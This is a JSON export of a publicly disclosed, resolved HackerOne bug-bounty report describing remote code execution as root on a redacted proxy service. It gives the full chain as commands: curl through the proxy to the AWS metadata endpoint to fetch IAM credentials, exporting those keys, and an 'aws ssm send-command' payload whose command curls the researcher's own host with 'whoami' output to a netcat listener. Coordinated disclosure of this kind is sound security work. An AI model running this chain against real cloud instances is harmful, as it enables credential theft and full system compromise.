{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": true, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": null, 
    "voters": [
        "tomdev", 
        "bull", 
        "smiegles", 
        "jobert", 
        "bl4de", 
        "spam404", 
        "hunter", 
        "cdl", 
        "teknogeek", 
        "alyssa_herrera", 
        "and 30 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 401136, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Remote Code Execution on Proxy Service (as root)", 
    "is_member_of_team?": null, 
    "vote_count": 40, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_view?": true, 
            "can_edit?": false, 
            "id": 10013, 
            "content": "## Introduction\nI discovered this remote code execution (RCE) vulnerability on a proxy service used to track researcher activity. It was an opportunity for me to learn more about AWS, and specifically the dangers of AWS EC2 Systems Manager combined with an open metadata API. \n\n## Impact update\nAfter back and forth with the \u2588\u2588\u2588\u2588\u2588\u2588 team, it became clear the vulnerable instance was hosted in a completely separate AWS account that was only shared with a limited number of identical instances. That makes it very unlikely this vulnerability could have been escalated to other applications such as \u2588\u2588\u2588\u2588\u2588\u2588.com or \u2588\u2588\u2588\u2588.\u2588\u2588\u2588\u2588\u2588\u2588.com.\n\n## Disclosure\nAs a courtesy, I sent this write up to the organization prior to disclosure. Unfortunately, the program explicitly required anonymized disclosure, hence the heavy redaction. Despite the missing context from the disappointing lack of transparency, I hope the community still finds this summary valuable. \n\nEnjoy!", 
            "content_html": "<h2 id=\"introduction\">Introduction</h2>\n\n<p>I discovered this remote code execution (RCE) vulnerability on a proxy service used to track researcher activity. It was an opportunity for me to learn more about AWS, and specifically the dangers of AWS EC2 Systems Manager combined with an open metadata API. </p>\n\n<h2 id=\"impact-update\">Impact update</h2>\n\n<p>After back and forth with the \u2588\u2588\u2588\u2588\u2588\u2588 team, it became clear the vulnerable instance was hosted in a completely separate AWS account that was only shared with a limited number of identical instances. That makes it very unlikely this vulnerability could have been escalated to other applications such as \u2588\u2588\u2588\u2588\u2588\u2588.com or \u2588\u2588\u2588\u2588.\u2588\u2588\u2588\u2588\u2588\u2588.com.</p>\n\n<h2 id=\"disclosure\">Disclosure</h2>\n\n<p>As a courtesy, I sent this write up to the organization prior to disclosure. Unfortunately, the program explicitly required anonymized disclosure, hence the heavy redaction. Despite the missing context from the disappointing lack of transparency, I hope the community still finds this summary valuable. </p>\n\n<p>Enjoy!</p>\n"
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": null, 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "reporter": {
                "username": "michiel", 
                "url": "/michiel"
            }, 
            "created_at": "2017-10-17T17:44:07.000Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-10-17T17:44:07.000Z", 
            "actor": {
                "username": "michiel", 
                "url": "/michiel", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/007/148ca8ec6766a1b0e556fcb6202947a5084069df_medium.png?1395443047"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "redact", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 3254043, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-08-27T17:48:45.043Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-08-27T17:48:45.043Z", 
            "actor": {
                "username": "michiel", 
                "url": "/michiel", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/007/148ca8ec6766a1b0e556fcb6202947a5084069df_medium.png?1395443047"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "redact", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 3254050, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "reporter": {
        "username": "michiel", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/michiel", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/007/269edb3bb231ea102c6e6ed5a4fed0965ef828d1_small.png?1395443047"
        }, 
        "is_me?": false
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "disclosed_at": "2018-08-27T17:48:44.909Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/401136", 
    "created_at": "2017-09-28T17:44:07.000Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>The proxy service used to provide researchers with access to certain programs on \u2588\u2588\u2588\u2588\u2588\u2588 allows access to AWS&#39;s Metadata API. This Metadata API in turn is configured to expose temporary AWS access credentials for the AWS EC2 Run Command role. When this role is assumed by an AWS client (e.g. the CLI), it is possible to execute arbitrary commands on AWS EC2 instances.</p>\n\n<h2 id=\"obtaining-the-aws-keys\">Obtaining the AWS keys</h2>\n\n<p>First up we are going to use cURL and to proof the AWS Metadata API is accessible:</p>\n<pre class=\"highlight plaintext\"><code>curl -vv http://169.254.169.254/latest/ -x &#39;52.6.\u2588\u2588.\u2588\u2588\u2588:25603&#39;\n</code></pre>\n<p>Here we are instructing cURL to load up AWS&#39;s Metadata API through the proxy. Since the proxy is hosted on AWS, and is not blocking traffic to internal IPs such as this API, we are able to gain access to it.</p>\n\n<p>To generate a temporary pair of access keys, we will run the following command:</p>\n<pre class=\"highlight plaintext\"><code>curl -vv http://169.254.169.254/latest/meta-data/iam/security-credentials/runCommand -x &#39;52.6.\u2588\u2588.\u2588\u2588\u2588:25603&#39;\n</code></pre>\n<p>The <code>runCommand</code> role is interesting and made me assume it was used for <a title=\"https://aws.amazon.com/ec2/run-command/\" href=\"/redirect?signature=62f7f5a31eaf85db123193ea4d310d4da04fb98f&amp;url=https%3A%2F%2Faws.amazon.com%2Fec2%2Frun-command%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://aws.amazon.com/ec2/run-command/</span><i class=\"icon-external-link\"></i></a>.</p>\n\n<h2 id=\"configuring-aws-cli\">Configuring AWS CLI</h2>\n\n<p>You will need to have the AWS CLI installed before you can continue.</p>\n\n<p>Now set the following environment variables:</p>\n<pre class=\"highlight plaintext\"><code>export AWS_ACCESS_KEY_ID=&lt;&quot;AccessKeyId&quot; you exposed in the last cURL command&gt;\nexport AWS_SECRET_ACCESS_KEY=&lt;&quot;SecretAccessKey&quot; you exposed in the last cURL commandt&gt;\nexport AWS_SESSION_TOKEN=&lt;&quot;Token&quot; you exposed in the last cURL command&gt;\n</code></pre>\n<p>Now in the same shell session you should be able to interact with several AWS services through the CLI.</p>\n\n<h2 id=\"executing-arbitrary-commands-as-root\">Executing arbitrary commands as root</h2>\n\n<p>Since the role name was <code>runCommand</code> I immediately went for AWS EC2 Systems Manager (specifically <code>aws ssm send-command</code>).</p>\n\n<p>With the access keys configured, I ran the following AWS CLI command to proof the keys indeed did have sufficient permissions to execute arbitrary commands:</p>\n<pre class=\"highlight plaintext\"><code>aws ssm send-command --instance-ids &quot;i-05b\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588adaa&quot; --document-name &quot;AWS-RunShellScript&quot; --comment &quot;whoami&quot; --parameters commands=&#39;curl 162.243.\u2588\u2588\u2588.\u2588\u2588\u2588:8080/`whoami`&#39; --output text --region=us-east-1\n</code></pre>\n<p>On my dev server I had a netcat listener running on port 8080 (<code>nc -vvkl 8080</code>) to capture the incoming cURL request. I also chose to execute a quick <code>whoami</code> command and pass it along as the path in the cURL HTTP call so I can quickly confirm what type of user is executing these commands.</p>\n\n<p>The HTTP request came in as follows:</p>\n<pre class=\"highlight plaintext\"><code>Connection from [52.73.\u2588\u2588.\u2588\u2588] port 8080 [tcp/http-alt] accepted (family 2, sport 45163)\nGET /root HTTP/1.1\nUser-Agent: curl/7.35.0\nHost: 162.243.\u2588\u2588\u2588.\u2588\u2588\u2588:8080\nAccept: */*\n</code></pre>\n<p>This was enough proof for me to conclude command execution is possible and these commands are executed as <strong>root</strong>.</p>\n\n<p>Note that I only tried this on one instance, but I am expecting there are more instances in the <code>us-east-1</code> region that allow this type of command execution (and potentially instances in other regions as well).</p>\n", 
    "vulnerability_information": "The proxy service used to provide researchers with access to certain programs on \u2588\u2588\u2588\u2588\u2588\u2588 allows access to AWS's Metadata API. This Metadata API in turn is configured to expose temporary AWS access credentials for the AWS EC2 Run Command role. When this role is assumed by an AWS client (e.g. the CLI), it is possible to execute arbitrary commands on AWS EC2 instances.\n\n## Obtaining the AWS keys\nFirst up we are going to use cURL and to proof the AWS Metadata API is accessible:\n\n```\ncurl -vv http://169.254.169.254/latest/ -x '52.6.\u2588\u2588.\u2588\u2588\u2588:25603'\n```\n\nHere we are instructing cURL to load up AWS's Metadata API through the proxy. Since the proxy is hosted on AWS, and is not blocking traffic to internal IPs such as this API, we are able to gain access to it.\n\nTo generate a temporary pair of access keys, we will run the following command:\n\n```\ncurl -vv http://169.254.169.254/latest/meta-data/iam/security-credentials/runCommand -x '52.6.\u2588\u2588.\u2588\u2588\u2588:25603'\n```\n\nThe `runCommand` role is interesting and made me assume it was used for https://aws.amazon.com/ec2/run-command/.\n\n## Configuring AWS CLI\nYou will need to have the AWS CLI installed before you can continue.\n\nNow set the following environment variables:\n\n```\nexport AWS_ACCESS_KEY_ID=<\"AccessKeyId\" you exposed in the last cURL command>\nexport AWS_SECRET_ACCESS_KEY=<\"SecretAccessKey\" you exposed in the last cURL commandt>\nexport AWS_SESSION_TOKEN=<\"Token\" you exposed in the last cURL command>\n```\n\nNow in the same shell session you should be able to interact with several AWS services through the CLI.\n\n## Executing arbitrary commands as root\nSince the role name was `runCommand` I immediately went for AWS EC2 Systems Manager (specifically `aws ssm send-command`).\n\nWith the access keys configured, I ran the following AWS CLI command to proof the keys indeed did have sufficient permissions to execute arbitrary commands:\n\n```\naws ssm send-command --instance-ids \"i-05b\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588adaa\" --document-name \"AWS-RunShellScript\" --comment \"whoami\" --parameters commands='curl 162.243.\u2588\u2588\u2588.\u2588\u2588\u2588:8080/`whoami`' --output text --region=us-east-1\n```\n\nOn my dev server I had a netcat listener running on port 8080 (`nc -vvkl 8080`) to capture the incoming cURL request. I also chose to execute a quick `whoami` command and pass it along as the path in the cURL HTTP call so I can quickly confirm what type of user is executing these commands.\n\nThe HTTP request came in as follows:\n\n```\nConnection from [52.73.\u2588\u2588.\u2588\u2588] port 8080 [tcp/http-alt] accepted (family 2, sport 45163)\nGET /root HTTP/1.1\nUser-Agent: curl/7.35.0\nHost: 162.243.\u2588\u2588\u2588.\u2588\u2588\u2588:8080\nAccept: */*\n```\n\nThis was enough proof for me to conclude command execution is possible and these commands are executed as **root**.\n\nNote that I only tried this on one instance, but I am expecting there are more instances in the `us-east-1` region that allow this type of command execution (and potentially instances in other regions as well).", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "", 
            "about": "\u2588\u2588\u2588\u2588\u2588\u2588 ", 
            "twitter_handle": "", 
            "name": "\u2588\u2588\u2588\u2588\u2588\u2588"
        }, 
        "handle": "redact", 
        "url": "https://hackerone.com/redact", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/031/807/95ebe78033c1c02be7d5e895da313a8a6fbb9074_small.jpg?1534322548", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/031/807/893b0d30cb5c5e9bc1b97743f8a7b122d8e7ecf7_medium.jpg?1534322548"
        }, 
        "id": 31807, 
        "permissions": []
    }, 
    "is_published": true
}